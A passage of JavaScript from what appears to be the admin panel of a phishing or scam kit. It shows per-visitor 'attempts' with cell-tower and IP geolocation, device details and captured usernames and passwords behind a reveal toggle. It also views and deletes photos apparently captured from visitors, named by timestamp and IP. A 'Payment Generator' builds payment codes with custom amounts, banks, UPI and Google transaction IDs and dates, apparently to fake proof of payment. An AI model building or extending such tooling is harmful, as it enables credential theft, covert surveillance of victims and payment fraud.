                if (attempt.geo.isp && !attempt.geo.towerName) html += `<div class="cell-meta">ISP: ${attempt.geo.isp}</div>`;
                if (attempt.geo.latitude && attempt.geo.longitude && !hasLocation) {
                    html += `<a href="https://www.google.com/maps?q=${attempt.geo.latitude},${attempt.geo.longitude}" target="_blank" class="map-link-btn">🗺️ Map (IP)</a>`;
                }
                html += `</div>`;
                hasLocation = true;
            }

            if (!hasLocation) {
                html = '<span style="color: var(--text-muted); font-size: 0.8rem;">—</span>';
            }

            return html;
        }

        function formatDetailedAddress(addr) {
            const parts = [];
            if (addr.houseNumber && addr.road) parts.push(`${addr.houseNumber} ${addr.road}`);
            else if (addr.road) parts.push(addr.road);
            if (addr.neighborhood) parts.push(addr.neighborhood);
            if (addr.city || addr.town || addr.village) parts.push(addr.city || addr.town || addr.village);
            if (addr.state) parts.push(addr.state);
            if (addr.postcode) parts.push(addr.postcode);
            if (addr.country) parts.push(addr.country);
            return parts.join(', ');
        }

        function getDeviceString(attempt) {
            // Priority 1: Full Device Details
            if (attempt.deviceDetails) {
                const d = attempt.deviceDetails;
                return `<div class="cell-strong">${d.platform || 'Unknown'}</div><div class="cell-meta">${d.screenResolution || ''}</div>`;
            }
            // Priority 2: User Agent Fallback (Simple Parse)
            if (attempt.userAgent) {
                const ua = attempt.userAgent;
                let platform = 'Unknown';
                if (ua.includes('Windows')) platform = 'Windows';
                else if (ua.includes('Mac')) platform = 'Mac';
                else if (ua.includes('Android')) platform = 'Android';
                else if (ua.includes('iPhone')) platform = 'iPhone';
                else if (ua.includes('Linux')) platform = 'Linux';
                return `<div class="cell-strong">${platform}</div><div class="cell-meta">Browser</div>`;
            }

            return '<span style="color: var(--text-muted); font-size: 0.8rem;">—</span>';
        }

        // ===== Credentials =====
        function maskString(str) {
            if (!str) return '';
            return '•'.repeat(Math.min(str.length, 16));
        }

        function escapeHtml(str) {
            if (!str) return '';
            const div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        }

        function toggleCredentials(index) {
            const userSpan = document.getElementById(`user-${index}`);
            const passSpan = document.getElementById(`pass-${index}`);
            const btn = document.getElementById(`btn-${index}`);
            if (!userSpan || !passSpan) return;

            const isMasked = userSpan.classList.contains('masked');
            if (isMasked) {
                userSpan.textContent = userSpan.dataset.value;
                passSpan.textContent = passSpan.dataset.value;
                userSpan.classList.remove('masked');
                passSpan.classList.remove('masked');
                btn.textContent = '🙈 Hide';
            } else {
                userSpan.textContent = maskString(userSpan.dataset.value);
                passSpan.textContent = maskString(passSpan.dataset.value);
                userSpan.classList.add('masked');
                passSpan.classList.add('masked');
                btn.textContent = '👁️ Show';
            }
        }

        // ===== Photo Actions =====
        async function deletePhoto(filename) {
            if (!confirm(`Delete ${filename}?`)) return;
            try {
                const response = await fetch(`/admin/photo/delete/${filename}`, { method: 'DELETE' });
                const result = await response.json();
                if (result.success) {
                    showToast('Photo deleted successfully', 'success');
                    loadData();
                } else {
                    showToast('Failed to delete photo', 'error');
                }
            } catch (error) {
                showToast('Error deleting photo', 'error');
            }
        }

        async function deleteAllPhotos() {
            if (!confirm('Delete ALL photos? This cannot be undone!')) return;
            try {
                const response = await fetch('/admin/photo/delete-all', { method: 'DELETE' });
                const result = await response.json();
                if (result.success) {
                    showToast(`Deleted ${result.count} photo(s)`, 'success');
                    loadData();
                } else {
                    showToast('Failed to delete photos', 'error');
                }
            } catch (error) {
                showToast('Error deleting photos', 'error');
            }
        }

        function downloadAllPhotos() {
            showToast('Download feature coming soon', 'success');
        }

        // ===== Lightbox =====
        let currentPhotoFilename = null;

        function viewPhoto(photoSrc) {
            currentPhotoFilename = photoSrc;
            const isUrl = photoSrc.startsWith('http');
            document.getElementById('lightbox-img').src = isUrl ? photoSrc : `/admin/photo/${photoSrc}`;
            document.getElementById('lightbox-caption').textContent = isUrl ? 'Cloudinary Capture' : photoSrc;
            document.getElementById('lightbox').style.display = 'flex';

            // Hide delete button for Cloudinary photos if not easily deletable
            document.getElementById('lightbox-delete-btn').style.display = isUrl ? 'none' : 'block';
        }

        function closeLightbox() {
            document.getElementById('lightbox').style.display = 'none';
            currentPhotoFilename = null;
        }

        async function deletePhotoFromLightbox() {
            if (!currentPhotoFilename) return;
            closeLightbox();
            await deletePhoto(currentPhotoFilename);
        }

        function getPhotoFilename(timestamp, ip) {
            const date = new Date(timestamp).toISOString().replace(/:/g, '-');
            const cleanIp = (ip || '').replace(/[.:]/g, '-');
            return `${date}_${cleanIp}.jpg`;
        }

        // ===== Toast =====
        function showToast(msg, type = 'success') {
            const existing = document.querySelector('.toast');
            if (existing) existing.remove();

            const toast = document.createElement('div');
            toast.className = `toast toast-${type}`;
            toast.innerHTML = `${type === 'success' ? '✅' : '❌'} ${msg}`;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }

        // ===== Utilities =====
        function refreshData() { loadData(); }

        function formatRelativeTime(date) {
            const seconds = Math.floor((new Date() - date) / 1000);
            if (seconds < 60) return `${seconds}s ago`;
            const minutes = Math.floor(seconds / 60);
            if (minutes < 60) return `${minutes}m ago`;
            const hours = Math.floor(minutes / 60);
            if (hours < 24) return `${hours}h ago`;
            const days = Math.floor(hours / 24);
            return `${days}d ago`;
        }

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') closeLightbox();
        });

        // ===== Payment Generator =====
        async function createPaymentLink(e) {
            e.preventDefault();
            const btn = e.target.querySelector('button[type="submit"]');
            const originalText = btn.innerHTML;
            btn.innerHTML = '⏳ Generating...';
            btn.disabled = true;

            const data = {
                amount: document.getElementById('gen-amount').value,
                toName: document.getElementById('gen-to').value,
                fromName: document.getElementById('gen-from').value,
                bankName: document.getElementById('gen-bank').value,
                upiId: document.getElementById('gen-upi').value,
                upiTxnId: document.getElementById('gen-upi-txn').value,
                googleTxnId: document.getElementById('gen-google-txn').value,
                customDate: document.getElementById('gen-date').value
            };

            try {
                const response = await fetch('/admin/api/generate-payment', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                const result = await response.json();

                if (result.success) {
                    document.getElementById('generated-result').style.display = 'block';
                    document.getElementById('gen-id-display').textContent = result.payment.id;
                    showToast('Payment code generated!', 'success');
                    btn.innerHTML = '✅ Created!';
                    setTimeout(() => {
                        btn.innerHTML = originalText;
                        btn.disabled = false;
                    }, 2000);
                } else {
                    showToast('Error: ' + result.error, 'error');
                    btn.innerHTML = originalText;
                    btn.disabled = false;
                }
            } catch (error) {
                showToast('Failed to generate payment link', 'error');
                btn.innerHTML = originalText;
                btn.disabled = false;
            }
        }

        function copyGenID() {
            const id = document.getElementById('gen-id-display').textContent.trim();
            navigator.clipboard.writeText(id).then(() => {
                showToast('Code copied to clipboard', 'success');
            });
        }

